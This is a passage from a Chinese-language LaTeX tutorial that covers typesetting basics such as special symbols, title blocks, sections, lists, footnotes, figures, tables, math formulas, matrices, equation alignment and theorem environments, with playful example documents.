注册商标符号 ™ \\texttrademark 商标符号 ° \\textdegree 度数符号 (文本模式) 破折号与连字号 类型 输入 渲染效果 用途 连字号 (Hyphen) - (一个 -) - 用于连接复合词，如state-of-the-art。 En 短破折号 (En-dash) -- (两个 -) – 用于表示数值、日期范围，如pages 10–20 Em 长破折号 (Em-dash) --- (三个 -) — 用于分隔句子——功能类似中文的破折号 URL和文件路径 网址和文件路径中经常包含_、%、\u0026amp;等特殊字符，直接输入会导致编译错误\n处理这个问题的最佳方法是使用url或hyperref宏包提供的\\url{}命令，还可以生成可点击的链接\n功能 命令 示例与说明 网址/路径 \\url{...} \\url{https://www.example.com/test_path?q=query%20space} • 自动处理特殊字符 • 允许在合适的位置断行 字母重音与变音符号 在输入一些非英语单词（如法语、德语）时，需要为字母添加重音符号\n虽然现代的XeLaTeX编译器通常支持直接输入这些字符，但使用命令还是好一些\n效果 命令 à \\`a 标题、作者与日期 这些信息构成了文档的“标题块”，通常显示在文档的最开始\n它们在导言区被定义，然后在正文区通过一个命令显示出来\n命令详解 命令 作用 使用区域 \\title{文档标题} 定义文档的主标题 导言区 \\author{作者姓名} 定义文档的作者 导言区 \\date{日期} 定义文档的日期\n可留空\\date{}不显示日期，或使用\\today自动生成当天日期 导言区 \\maketitle 将以上三个命令定义的信息生成并显示在文档中 正文区 \\title{...}、\\author{...}、\\date{...}这三个命令在\\begin{document}之前被调用，它们只是将内容“暂存”起来，并不会直接显示任何东西\n进入\\begin{document}环境后，\\maketitle命令被调用，它会读取之前暂存的标题、作者和日期信息，并按照ctexart文档类型预设的、规范的格式将它们排版输出\n示例 \\documentclass[12pt]{ctexart} \\title{噢耶，构构的文档} \\author{张顺三} \\date{\\today} \\begin{document} \\maketitle 文档的正文 \\end{document} 编译结果：\n章节与目录 对于结构化的长文档，章节是必不可少的\nLaTeX通过简单的命令即可创建带自动编号的章节，并基于这些章节信息自动生成目录\n命令详解 命令 层级 适用文档类型 \\chapter{章标题} 章 book, report \\section{节标题} 节（一级标题） article, report, book \\subsection{小节标题} 小节（二级标题） article, report, book \\subsubsection{小小节标题} 小小节（三级标题）\nLaTeX默认只有三级标题，到此为止 article, report, book \\tableofcontents - 所有 \\tableofcontents命令会在其所在位置插入一个完整的目录\nLaTeX会自动扫描全文的章节命令来生成此目录\n在Overleaf中，目录的更新是自动的；在本地环境中，有时需要编译两次才能正确生成\n示例 \\documentclass{ctexart} \\title{噢耶，构构的文档} \\author{张顺三} \\date{\\today} \\begin{document} \\maketitle \\tableofcontents \\section{引言} 第一部分的正文内容 \\subsection{研究背景} 第一部分第一节的正文内容 \\subsubsection{地点调研} 第一部分第一节第一点的正文内容 \\section{实验方法} 第二部分的正文内容 \\end{document} 编译结果：\n摘要与关键词 摘要（Abstract）是学术文章开头不可或缺的部分，它简要概括了文章的核心内容\n在article和ctexart等文档类型中，LaTeX提供了专门的abstract环境来排版摘要\n环境与命令 环境 / 命令 功能说明 \\begin{abstract}\n...\n\\end{abstract} 摘要环境\n放置在此环境中的文本会被自动格式化为摘要样式（通常会带有“摘要”标题，并采用稍窄的页边距） \\textbf{关键词：} 关键词并没有标准的独立命令，通常的做法是在摘要内容的末尾，手动换行并使用粗体命令来添加关键词列表 示例 \\documentclass{ctexart} \\author{笔者} \\title{摘要的示例} \\begin{document} \\maketitle % 先显示标题 \\begin{abstract} \\noindent 本文旨在提供一个关于如何在 LaTeX 中创建摘要和关键词的完整示例，通过使用 \\texttt{abstract} 环境，我们可以轻松地生成符合学术规范的摘要部分 \\vspace{1ex} % 在摘要和关键词之间增加一点垂直距离 \\noindent\\textbf{关键词：} LaTeX；摘要；关键词；学术写作 \\end{abstract} \\section{引言} 正文内容 \\end{document} 编译结果：\n\\begin{abstract}...\\end{abstract}环境会自动在文档标题下方生成一个居中的摘要标题，并将环境内的文本以特定格式进行排版\n在摘要正文结束后，我们使用\\vspace{1ex} 增加了一个小间距，然后用\\noindent取消了接下来的行缩进，并通过\\textbf{关键词：} 创建了加粗的关键词标题\n列表环境 列表是组织和呈现条目式信息的有效方式\nLaTeX提供了多种列表环境，它们都以\\begin{...}开始，以\\end{...}结束\n列表中的每个项目都由\\item命令开始\n环境详解 环境名称 列表类型 特点 itemize 无序列表 各项默认使用•(实心圆点)作为项目符号 enumerate 有序列表 各项自动编号，默认使用1.，2.，3. \u0026hellip; 作为项目符号 description 描述列表 各项使用\\item[标签]自定义标签，标签会加粗显示，适合术语解释 任何列表环境都可以嵌套在另一个列表的\\item中，形成多级列表\n示例 \\section{水果分类} \\begin{description} \\item[常见水果（描述列表）] 这是一些常见的水果： \\begin{enumerate} \\item 苹果（有序列表） \\item 香蕉 \\end{enumerate} \\item[不常见水果（描述列表）] 这是一些不常见的水果： \\begin{itemize} \\item 榴莲（无序列表） \\item 蛇皮果 \\end{itemize} \\end{description} 编译结果：\n最外层是一个description列表，用\\item[常见水果]和\\item[不常见水果]创建了两个带自定义粗体标签的条目\n在常见水果条目内部，嵌套了一个enumerate环境，创建了带自动编号1.和2.的有序列表\n在不常见水果条目内部，嵌套了一个itemize环境，创建了带•符号的无序列表\n脚注 脚注用于在页面底部对正文内容进行补充说明、注释或提供引文来源\nLaTeX 提供了完善的自动化支持，可以自动编号和定位\n命令 命令 作用与说明 \\footnote{脚注内容} 它会在命令所在的位置插入一个上标数字，\n并将花括号{}中的脚注内容自动放置在当前页面的底部 \\footnotemark[编号] 只生成上标数字标记，但不生成页面底部的脚注文本\n用于\\footnote命令无法正常工作的特殊环境\n编号可以省略，也可以加上来指定脚注 \\footnotetext[编号]{脚注内容} 只生成页面底部的脚注文本，不生成上标标记\n通常与\\footnotemark配对使用\n编号可以省略，省略时自动递增 编号规则 默认编号规则 使用\\footnote{}：\nLaTeX会自动给每个脚注分配连续编号（从 1 开始），编号会根据出现顺序递增\n第一条脚注\\footnote{内容 A} 第二条脚注\\footnote{内容 B} 使用\\footnotemark + \\footnotetext：\n如果不指定编号，\\footnotemark会自动使用下一个可用编号，对应的\\footnotetext默认使用同一个编号\n文字\\footnotemark % 自动分配编号 1 \\footnotetext{脚注内容} % 编号 1 下一个脚注会自动编号2：\n字1\\footnotemark \\footnotetext{脚注内容1} 字2\\footnotemark \\footnotetext{脚注内容2} 一定要在每个标记后紧跟内容（也就是mark+text成对出现），不然footnotetext无法识别新的编号：\n字1\\footnotemark 字2\\footnotemark \\footnotetext{脚注内容1} \\footnotetext{脚注内容2} \\footnotemark使用时，会让当前页脚计数器footnote的值加1\n当我们连续两次使用\\footnotemark但还没有用\\footnotetext，LaTeX会把两次标记都绑定到当前计数器值，因此两个标记都显示为2\n手动指定编号 可以在方括号[]里指定编号，编号不会按顺序递增，而是使用我们指定的数字\n第一次引用\\footnotemark[1] 第二次引用\\footnotemark[5] \\footnotetext[1]{脚注内容1} \\footnotetext[5]{脚注内容5} 多次引用同一脚注 第一次引用\\footnotemark[1]，第二次引用同一脚注\\footnotemark[1] \\footnotetext[1]{脚注内容} 特别注意 \\footnotemark不增加编号计数，除非与\\footnotetext配合\n\\footnote{}会同时生成标记和内容，计数自动递增\n手动编号要小心，避免与自动编号冲突\n示例1：常规用法 \\LaTeX \\footnote{发音为 /`laːtɛx/} 是一种高质量的排版系统 这个系统基于 TeX\\footnote{TeX 是排版引擎，而 \\LaTeX 是基于 TeX 的宏包} 编译结果：\n这里使用的\\LaTeX是一个比较好玩的命令，会显示LaTeX的logo\n示例2：在表格等特殊环境中使用 在tabular环境中，直接使用\\footnote 会出错，此时需要\\footnotemark和\\footnotetext 的组合\n表格在后面会讲到：创建表格 \\begin{table}[h] \\centering \\caption{在表格中使用脚注} \\begin{tabular}{|l|c|} \\hline 项目 \u0026amp; 预测数值\\footnotemark[1] \\\\ 拨款博丽神社 \u0026amp; 999999999\\footnotemark[2] \\\\ \\hline \\end{tabular} \\end{table} \\footnotetext[1]{此数值为初步估算} \\footnotetext[2]{此数值为完全虚构} 编译结果：\n插入图片 在 LaTeX 中插入图片通常分为三步：\n加载宏包 上传图片 使用figure环境和\\includegraphics命令 图片通常被放置在浮动体(figure)环境中，这允许 LaTeX 自动寻找页面上最合适的位置放置图片，避免产生难看的大片空白\n准备工作 加载宏包 在导言区必须导入graphicx包：\n\\usepackage{graphicx} 上传图片 在Overleaf的左侧文件列表中，点击 \u0026ldquo;Upload\u0026rdquo; 按钮，上传我们的图片文件\n请确保图片文件与.tex文件在同一目录下或在子目录中（此时引用需写明路径，如images/logo.png）\nfigure环境 这是包裹图片及其相关信息（如标题）的容器，下面我们一步步解析构成figure环境的各个命令\n\\begin{figure}[位置建议符] **这个命令标志着一个figure浮动环境的开始，注意b\n方括号[]中的位置建议符是可选的，我们通过它向LaTeX建议我们希望图片出现的位置\n常用的建议符有：\n参数 英文含义 说明 常用组合示例 说明 h here 尽可能把浮动体放在当前位置（代码所在位置附近） [h] 单独使用时可能不生效，因为LaTeX仍然会遵循排版规则 t top 尝试把浮动体放在页面顶部 [t] 浮动体优先放在页面顶部 b bottom 尝试把浮动体放在页面底部 [b] 浮动体优先放在页面底部 p page 将浮动体放在一个只包含浮动体的专门页面 [p] 适合大量图表或大表格 ! override 忽略部分限制，强制LaTeX尽量遵守指定位置 [!h] 例如[!ht]，让LaTeX尽量放在当前位置或顶部 H here absolutely 强制浮动体出现在当前位置，不允许浮动（需float宏包） [H] 完全固定位置，不浮动 我们可以将这些建议符组合使用，例如[htbp]，这会告诉LaTeX：\n优先尝试放在这里(h)，如果不行就放在页顶(t)，再不行就放在页底(b)，最差的情况就单独放一页(p)\n\\centering 此命令会使其环境内的内容（在这里就是我们的图片）在页面上水平居中显示\n它独占一行，不需要花括号\n\\includegraphics 这是实际插入图片文件的命令，通常放在figure环境内部\n格式:\n\\includegraphics[可选参数]{图片文件名} 可选参数 功能说明 width=8cm 指定图片的显示宽度为8厘米 width=0.5\\textwidth 指定图片的显示宽度为当前文本区域宽度的50%\n这是一种更灵活、更推荐的方式，因为它会自动适应不同页面设置 height=6cm 指定图片的显示高度 scale=0.5 将图片缩放至原始尺寸的50% angle=45 将图片逆时针旋转45度 \\caption{图片标题} 这个命令会为我们的图片生成一个带自动编号的标题（例如\u0026quot;图1: 公司Logo\u0026quot;）\nLaTeX会自动管理编号，我们完全无需担心顺序问题，只需要在花括号{}中写入图片的描述即可\n\\label{标签名} 该命令为图片设置一个独一无二的标签，用于在正文中进行交叉引用，标签本身不会在文档中显示任何内容\n为了便于管理，我们推荐使用fig:作为图片标签的前缀，也就是写成\\label{fig:标签名}\n设置好标签后，我们就可以在文中的任何地方使用\\ref{fig:标签名}来引用这张图片的编号\n\\end{figure} 这个命令标志着figure环境的结束\n示例 \\documentclass{ctexart} \\usepackage{graphicx} \\begin{document} \\section{公司简介} 如图 \\ref{fig:logo} 所示，这是我们公司的Logo，可爱捏 \\begin{figure}[htbp]\t\\centering \\includegraphics[width=0.4\\textwidth]{2.png} \\caption{公司 Logo} \\label{fig:logo} \\end{figure} \\end{document} 编译结果：\n(确保1.png文件已上传至当前Overleaf项目中，注意文件路径)\n\\begin{figure}[htbp]\n开始一个图片浮动环境，并建议LaTeX将其放置在当前位置、页面顶部或底部\n\\centering\n命令\\includegraphics输出的图片将会在可用宽度内居中\n\\includegraphics[width=0.4\\textwidth]{logo.png}\n{logo.png}: 指定要插入的图片文件 [width=0.4\\textwidth]: 将该图片的显示宽度设置为页面文本宽度的 40% \\caption{公司 Logo}\n在图片下方生成带编号的标题\n\\label{fig:logo}\n为该图赋予一个唯一的标签fig:logo\n在正文中，如图 \\ref{fig:logo} 所示 这句话在编译后会自动变成 “如图 1 所示”，实现了自动引用\n创建表格 与图片类似，表格通常被放置在一个叫table的浮动环境中，以便排版和添加标题\n而表格的实际内容则由tabular环境构建\n对于复杂表格，使用在线表格生成器（如 TablesGenerator.com ）可以大大提高效率！\n环境与命令 table环境 table环境是表格的浮动容器，其作用和用法与figure环境几乎完全相同，它允许LaTeX自动寻找最佳位置放置表格，其中\\begin{table}[htbp]，\\centering，\\caption{}和\\label{}命令的用法也完全一致\n为了区分，我们最好使用tab:作为表格标签的前缀，例如\\label{tab:my-data}\ntabular环境 它就类似图片的\\includegraphics，是构建表格内容的主体，所有的文本、数字和分隔线都在这个环境中定义\n一般也放在table环境中\n\\begin{tabular}{列格式定义} 这个命令标志着表格实际内容的开始\n它有一个必须填写的参数{列格式定义}，由一组特殊的字符构成，用于定义表格有多少列以及每一列的对齐方式\n符号 含义 说明 l left 定义一个左对齐的列 c center 定义一个居中对齐的列 r right 定义一个右对齐的列 例如，{l|c|r} 表示创建一个三列的表格，第一列左对齐，第二列居中，第三列右对齐，列与列之间用竖线隔开\n内容和边框 在 tabular 环境内部，我们使用以下符号和命令来填充内容和绘制线条：\n命令 作用/说明 \u0026amp; 列分隔符，用于分隔同一行的不同列，如果一行有n列，则该行应有n-1个\u0026amp; \\\\ 行结束符，结束当前行，后续内容将成为新的一行 \\hline 水平线命令，绘制贯穿表格所有列的完整水平线，通常放在一行的\\\\之后，分隔不同的行 \\cline{i-j} 局部水平线命令，从第i列左边开始，到第j列右边结束，可精细控制水平线的范围 示例 \\documentclass{ctexart} \\begin{document} \\section{幻想乡智力表} \\begin{table}[htbp] \\centering \\caption{请输入文本} \\label{tab:table} \\begin{tabular}{|c|c|} \\hline \\textbf{妖精姓名} \u0026amp; \\textbf{智商} \\\\ \\hline 大妖精 \u0026amp; 1 \\\\ \\hline 露娜 \u0026amp; 1 \\\\ \\hline 琪露诺 \u0026amp; 9 \\\\ \\cline{2-2} \u0026amp; 4+5 \\\\ \\hline \\end{tabular} 表格底下也能写字哈哈，到底能多长长长长长长长长长长呢 \\end{table} 该表格的编号是：\\ref{tab:table} 和图片一样，引用得到的都是编号 \\end{document} 编译结果：\n\\begin{table}[htbp] ... \\end{table}\n创建一个表格浮动体\n\\centering, \\caption, \\label\n分别使表格居中、添加标题和设置引用标签tab:table\n\\begin{tabular}{|c|c|}\n开始tabular环境\n{|c|c|} 定义了表格的格式：最外层有竖线，共两列居中对齐(c)，列之间都有竖线(|)\n\\hline\n在表格的顶部、标题行下方和底部绘制了完整的水平分割线\n\\textbf{妖精姓名} \u0026amp; \\textbf{智商} \\\\\n这是表格的标题行，\u0026amp;分隔了三列的内容，\\\\结束该行，这里还使用了\\textbf命令对标题文字加粗\n琪露诺 \u0026amp; 9 \\\\\n这是第三行数据\n\u0026amp; 4+5 \\\\\n这是第四行数据，注意，因为姓名这一列的内容与上一行相同，所以第一个 \u0026amp; 前留空即可\n\\cline{2-2}\n绘制了一条第2列的水平线\n\\ref{tab:table}\n引用表格的编号\n数学公式 这是LaTeX最强大的功能，也是它在科技写作领域无可替代的原因\n准备工作 在开始之前，确保我们在导言区已经加载了amsmath宏包，它是美国数学学会提供的数学公式扩展包\n通常，我们还会一并加载amssymb（更多符号）和bm（公式加粗）\n\\usepackage{amsmath, amssymb, bm} 公式模式 LaTeX提供了多种将文本切换到“数学模式”的方式，主要分为三大类\n行内 无编号行间 有编号行间 模式分类 模式类型 代码实现 特点 行内公式 $...$ 公式嵌入在普通文本行中\n会为了适应行高而适当压缩公式的大小，例如分数会变小 无编号行间公式 \\[...\\] 公式会单独成行并居中显示\n以标准、清晰的尺寸进行排版，但不带自动编号 有编号行间公式 \\begin{equation}\n...\n\\end{equation} 与\\[...\\]类似，但会自动在公式右侧添加一个带括号的编号\n可以使用\\label加上标签，文中使用\\eqre引用其编号\n只能写一行公式，要多行必须结合aligned等环境 示例 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{勾股定理} \\noindent 勾股定理是一个基本的几何定理，它说明在直角三角形中，两条直角边的平方和等于斜边的平方，即： $a^2 + b^2 = c^2$，这是一个行内公式\\\\ 我们可以将这个关系式单独展示出来，使其更醒目： \\[ a^2 + b^2 = c^2 \\]\\\\ 为了方便在后文中引用，我们通常使用带编号的公式环境： \\begin{equation} a^2 + b^2 = c^2 \\label{eq:pythagoras} \\end{equation}\\\\ 根据公式 \\eqref{eq:pythagoras}（这个编号是引用的喔），我们可以进行后续的计算 \\end{document} 编译结果：\n$...$\n$符号使a^2 + b^2 = c^2 以行内模式插入文本中\n\\[...\\]\n\\[和\\]将公式在单独一行中居中显示\n\\begin{equation}...\\end{equation}\n这个环境不仅使公式居中独立显示，还在右侧生成了编号(1)\n\\label{eq:pythagoras}\n我们在equation环境内部为这个公式贴上了一个标签eq:pythagoras\n\\eqref{eq:pythagoras}\n在正文中，我们使用\\eqref命令引用该标签，LaTeX自动将其替换为带括号的对应编号(1)\n常用数学命令 数学符号和结构是通过反斜杠\\开头的命令生成的，下面是几类最常用的命令\n上下标、根号与撇（求导） 注意: 上下标内容如果多于一个字符，必须用花括号{}包裹！\n功能 命令 示例 渲染效果 上标 ^ x^{2y} $x^{2y}$ 下标 _ a_{ij} $a_{ij}$ 多字符上/下标 ^{...},_{...} x^{n+1}, a_{i,j} $x^{n+1}, a_{i,j}$ 同时上下标 _...^... x_i^2 $x_i^2$ 局部上下标 \\limits \\sum\\limits_{i=1}^n $\\sum\\limits_{i=1}^n$ 根号 \\sqrt{} \\sqrt{1+x^2} $\\sqrt{1+x^2}$ n次方根 \\sqrt[n]{} \\sqrt[4]{16} $\\sqrt[4]{16}$ 连续根号 多重 \\sqrt \\sqrt{\\sqrt{x}} $\\sqrt{\\sqrt{x}}$ 撇（导数） ' f''(x) $f\u0026rsquo;\u0026rsquo;(x)$ 高阶导数 ^{(n)} f^{(3)}(x) $f^{(3)}(x)$ 点记号（微分） \\dot{}, \\ddot{} \\dot{x}, \\ddot{y} $\\dot{x}, \\ddot{y}$ 分数 功能 命令 示例 渲染效果 标准分数 \\frac{}{} \\frac{1}{x+y} $\\frac{1}{x+y}$ 行间分数 \\dfrac{}{} \\dfrac{1}{x+y} $\\dfrac{1}{x+y}$ 行内小分数 \\tfrac{}{} \\tfrac{1}{2} $\\tfrac{1}{2}$ 连续分数 嵌套 \\frac \\frac{1}{1+\\frac{1}{x}} $\\frac{1}{1+\\frac{1}{x}}$ 二项式系数 \\binom{n}{k} \\binom{n}{k} $\\binom{n}{k}$ 组合公式 \\tbinom{n}{k} / \\dbinom{n}{k} \\dbinom{n}{k}, \\tbinom{n}{k} $\\dbinom{n}{k}, \\tbinom{n}{k}$ 常见运算符 功能 命令 示例 渲染效果 求和 \\sum \\sum_{i=1}^{n} i $\\sum_{i=1}^{n} i$ 连乘 \\prod \\prod_{i=1}^{n} x_i $\\prod_{i=1}^{n} x_i$ 积分 \\int \\int_{a}^{b} f(x) \\, dx $\\int_{a}^{b} f(x) , dx$ 二重/三重积分 \\iint, \\iiint \\iint_D f(x,y) \\, dxdy $\\iint_D f(x,y) , dxdy$ 极限 \\lim \\lim_{x \\to \\infty} \\frac{1}{x} $\\lim_{x \\to \\infty} \\frac{1}{x}$ 并集 \\bigcup \\bigcup_{i=1}^{n} A_i $\\bigcup_{i=1}^{n} A_i$ 交集 \\bigcap \\bigcap_{i=1}^{n} B_i $\\bigcap_{i=1}^{n} B_i$ 上确界 \\sup \\sup_{x \\in S} f(x) $\\sup_{x \\in S} f(x)$ 下确界 \\inf \\inf_{x \\in S} f(x) $\\inf_{x \\in S} f(x)$ 绝对值 \\lvert ... \\rvert \\lvert a \\rvert $\\lvert a \\rvert$ 范数 \\Vert ... \\Vert \\Vert v \\Vert $\\Vert v \\Vert$ 上取整 \\lceil ... \\rceil \\lceil 3.2 \\rceil $\\lceil 3.2 \\rceil = 4$ 下取整 \\lfloor ... \\rfloor \\lfloor 3.7 \\rfloor $\\lfloor 3.7 \\rfloor = 3$ 点乘 \\cdot \\vec{a} \\cdot \\vec{b} $\\vec{a} \\cdot \\vec{b}$ 向量叉乘 \\times \\vec{a} \\times \\vec{b} $\\vec{a} \\times \\vec{b}$ 省略符 横向省略号 \\dots 1,2,\\dots,n $1,2,\\dots,n$ 横向居中省略号 \\cdots a_1 + a_2 + \\cdots + a_n $a_1 + a_2 + \\cdots + a_n$ 纵向省略符号 \\vdots 矩阵元素省略 $\\vdots$ 对角线省略符号 \\ddots 矩阵元素省略 $\\ddots$ 希腊字母 小写 命令 大写 命令 α \\alpha Α \\Alpha（很少用） β \\beta Β \\Beta（很少用） γ \\gamma Γ \\Gamma δ \\delta Δ \\Delta ϵ \\epsilon Ε \\Epsilon（很少用） ζ \\zeta Ζ \\Zeta（很少用） η \\eta Η \\Eta（很少用） θ \\theta Θ \\Theta ι \\iota Ι \\Iota（很少用） κ \\kappa Κ \\Kappa（很少用） λ \\lambda Λ \\Lambda μ \\mu Μ \\Mu（很少用） ν \\nu Ν \\Nu（很少用） ξ \\xi Ξ \\Xi ο o Ο \\Omicron（很少用） π \\pi Π \\Pi ρ \\rho Ρ \\Rho（很少用） σ \\sigma Σ \\Sigma τ \\tau Τ \\Tau（很少用） υ \\upsilon Υ \\Upsilon φ \\phi Φ \\Phi χ \\chi Χ \\Chi（很少用） ψ \\psi Ψ \\Psi ω \\omega Ω \\Omega 关系符 功能 命令 渲染效果 小于等于 \\leq $\\leq$ 大于等于 \\geq $\\geq$ 不等于 \\neq $\\neq$ 近似 \\approx $\\approx$ 恒等 \\equiv $\\equiv$ 相似 \\sim $\\sim$ 成比例 \\propto $\\propto$ 小于 \u0026lt; $\u0026lt;$ 大于 \u0026gt; $\u0026gt;$ 竖线（用于概率、集合等） \\mid $\\mid$ 逻辑符号 功能 命令 渲染效果 全称量词 \\forall $\\forall$ 存在量词 \\exists $\\exists$ 逻辑与集合符号 符号 命令 渲染效果 空集 \\emptyset $\\emptyset$ 集合元素 \\in $\\in$ 非集合元素 \\notin $\\notin$ 并集 \\cup $\\cup$ 交集 \\cap $\\cap$ 子集 \\subset $\\subset$ 真子集 \\subsetneq $\\subsetneq$ 括号 功能 命令 说明 固定大小 ( ), [ ], \\{ \\} 尺寸固定，不会随内容变化。输入 {} 需用 \\ 转义 自动缩放 \\left(...\\right) 根据内容自动调整大小，必须成对使用 方括号缩放 \\left[...\\right] 自动缩放方括号 大括号缩放 \\left\\{...\\right\\} 自动缩放大括号 尖括号 \\langle ... \\rangle 常用于内积 双竖线符号 \\Vert 双竖线，常用于范数或矩阵行列式 矩阵 在LaTeX中排版矩阵是一项核心功能，amsmath宏包为此提供了一系列功能强大且使用便捷的环境\n这些环境可以自动处理元素的对齐和外层括号的样式\n无论使用哪种矩阵环境，内部语法都是统一的：\n使用\u0026amp;分隔列，即分隔同一行中的元素 使用\\\\来结束当前行，并开始新的一行 和表格很像吧\n矩阵环境 amsmath提供了多种矩阵环境，它们唯一的区别在于最终呈现时外层使用的括号（分隔符）不同\n环境名称 外层括号 常见用途 pmatrix ( ) (圆括号) 用于表示标准的矩阵 bmatrix [ ] (方括号) 同样用于标准矩阵，在一些文献中更常见，也常用于增广矩阵 vmatrix ` Vmatrix ‖ ‖ (双竖线） 专门用于表示矩阵或向量的范数 matrix (无括号) 只排列元素，不添加外层括号\n当你需要使用特殊的括号（如{ }）或根本不需要括号时使用 smallmatrix (无括号) 用于在行内创建小型矩阵\n例如$A = \\begin{smallmatrix} 1 \u0026amp; 0 \\ 0 \u0026amp; 1 \\end{smallmatrix}$ 矩阵中的省略号 命令 方向 用途 \\cdots 水平 (Horizontal) 用于省略行中的元素 \\vdots 垂直 (Vertical) 用于省略列中的元素 \\ddots 对角 (Diagonal) 用于省略对角线上的元素 示例 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{矩阵示例} 一个 3x3 的矩阵 A 可以用 \\texttt{pmatrix} 表示： \\[ A = \\begin{pmatrix} 1 \u0026amp; 2 \u0026amp; 3 \\\\ 4 \u0026amp; 5 \u0026amp; 6 \\\\ 7 \u0026amp; 8 \u0026amp; 9 \\end{pmatrix} \\] 一个 2x2 的行列式可以用 \\texttt{vmatrix} 表示： \\[ \\det(B) = \\begin{vmatrix} x \u0026amp; y \\\\ z \u0026amp; w \\end{vmatrix} \\] 一个 n 阶的单位矩阵 $I_n$ 可以用 \\texttt{bmatrix} 和省略号清晰地表示： \\[ I_n = \\begin{bmatrix} 1 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \\\\ 0 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 0 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 1 \\end{bmatrix} \\] \\end{document} 编译结果：\n矩阵 A:\n\\begin{pmatrix}和\\end{pmatrix} 创建了一个外层为圆括号的矩阵环境 1 \u0026amp; 2 \u0026amp; 3 \\\\定义了矩阵的第一行：1，2，3三个元素由\u0026amp;分隔，\\\\表示此行结束。后续行同理 行列式 det(B):\n\\begin{vmatrix}和\\end{vmatrix}创建了一个外层为单竖线的环境，这正是行列式的标准数学符号 单位矩阵 I_n:\n\\begin{bmatrix}和\\end{bmatrix}创建了一个外层为方括号的环境 \\cdots被用来表示第一行和第二行中间被省略的0 \\vdots被用来表示各列中间被省略的0 \\ddots巧妙地表示了从左上到右下的对角线上被省略的1 通过这些省略号命令的组合，我们能够清晰地表达任意大小的通用矩阵 多行公式对齐 对于较长的公式推导或一组需要对齐的方程，必须将其拆分为多行以保证清晰可读\namsmath宏包为此提供了多种功能强大的环境，核心控制语法是：\n使用\u0026amp;标记对齐点 使用\\\\换行 哦，还是表格的用法\n环境详解 不同的环境主要区别在于编号方式和对齐能力。\n环境名称 编号方式 核心特点与用途 aligned 整体一个编号 本身不产生编号，提供对齐功能\n必须嵌套在其他数学环境（如equation, \\[...\\]）中使用 split 整体一个编号 和aligned几乎相同，但长公式换行时编号的位置在公式中间\n必须嵌套在其他数学环境（如equation, \\[...\\]）中使用 gather 每行独立编号 用于将一组不需要对齐的公式堆叠在一起\n每行都会居中并获得一个独立的编号 align 每行独立编号，\n可灵活对齐 允许像写一个两列的表格一样对齐公式（在\u0026amp;处对齐）\n每行默认都会获得一个编号 align* 完全无编号 是align的无编号版本，功能完全相同，但所有行都不会产生编号 控制编号 在align / gather等逐行编号的环境中，如果不希望某一行显示编号，可以在该行的\\\\之前使用以下命令:\n\\notag\n\\nonumber\n示例1：aligned环境 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{公式推导} 二次展开式的推导过程如下： \\begin{equation} \\label{eq:expand} \\begin{aligned} (a+b)^2 \u0026amp;= (a+b)(a+b) \\\\ \u0026amp;= a^2 + ab + ba + b^2 \\\\ \u0026amp;= a^2 + 2ab + b^2 \\end{aligned} \\end{equation} 整个过程由公式 \\eqref{eq:expand} 概括 \\end{document} 编译结果：\n\\begin{equation}\n最外层是equation环境，意味着内部的所有内容，无论有多少行，都将作为一个整体，共享一个编号\n\\begin{aligned}\n内部的aligned环境是实际负责对齐工作的\n\u0026amp;=\n每一行的=前面都放置了对齐符\u0026amp;，使得三行公式的等号在垂直方向上对齐（实际是\u0026amp;被对齐了）\n\\\\\n在第一行和第二行的末尾用于换行\n示例2：align环境 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{方程组} 我们有如下一组基本方程： \\begin{align} a_1 x + b_1 y \u0026amp;= c_1 \\label{eq:line1} \\\\ a_2 x + b_2 y \u0026amp;= c_2 \\notag \\\\ E \u0026amp;= mc^2 \\label{eq:emc2} \\end{align} 其中，方程 \\eqref{eq:line1} 和 \\eqref{eq:emc2} 是最重要的 \\end{document} 编译结果：\n\\begin{align}\n这个环境会默认给每一行分配一个编号\n\u0026amp;=\n\u0026amp;同样被放在=前面，使得三行公式的等号对齐\n\\label{eq:line1}\n我们可以在任意行后面添加\\label以引用这行的编号，而不是在整个环境中\n\\notag\n在第二行的\\\\前，我们加入了\\notag命令，阻止LaTeX为这一行生成编号\n学术写作 定理类环境 在数理、计算机等学科的写作中，需要频繁使用“定理”、“引理”、“定义”等结构化论述\namsthm 宏包为此提供了标准化的解决方案。\n定义新环境：\\newtheorem 在使用定理环境前，必须先在导言区用\\newtheorem命令进行定义它\n\\newtheorem{新环境名}[共享环境名]{显示标题}[编号层级] 常用用法：\n语法 说明 \\newtheorem{环境名}{显示标题} 定义一个全新的、独立编号的环境 \\newtheorem{环境名}{显示标题}[编号层级] 使该环境的编号与某个层级关联\n最常用的是[section]，表示编号为[章节号].[定理号]，且每章重新从1开始 \\newtheorem{新环境名}[共享环境名]{显示标题} 使新环境与某个已定义的环境共享同一个编号序列 在正文中使用 用法 说明 \\begin{环境名} ... \\end{环境名} 开始一个标准的定理环境 \\begin{环境名}[自定义标题] ... \\end{环境名} 在方括号中添加的标题，会显示在编号后的括号里 \\begin{proof} ... \\end{proof} amsthm 提供的标准证明环境\n会自动以证明.开头，并以一个 Q.E.D. 方块□结尾 示例 \\documentclass{ctexart} \\usepackage{amsthm} \\newtheorem{theorem}{定理}[section] % 定理环境，编号与 section 关联 \\newtheorem{lemma}[theorem]{引理} % 引理环境，与 theorem 共享编号 \\newtheorem{corollary}[theorem]{推论} % 推论环境，与 theorem 共享编号 \\newtheorem{definition}{定义} % 定义环境，独立编号 \\begin{document} \\section{主要结果} 我们首先给出一个关键定义： \\begin{definition} 这个定义很关键 \\end{definition} 然后是本节的核心定理： \\begin{theorem}[勾股定理] \\label{thm:pythagoras} 在一个直角三角形中，两条直角边的平方和等于斜边的平方 \\end{theorem} \\begin{proof} 证明过程略 \\end{proof} 基于定理 \\ref{thm:pythagoras}，我们有一个直接的引理 \\begin{lemma} 这是一个直接的引理 \\end{lemma} 我们还有一个推论： \\begin{corollary} 这是一个推论 \\end{corollary} \\end{document} 定义解释:\n\\newtheorem{theorem}{定理}[section]\n创建了theorem环境，显示为“定理”，编号格式为 [章节号].[定理号] (如 1.1, 1.2 \u0026hellip;)\n\\newtheorem{lemma}[theorem]{引理} \u0026amp; 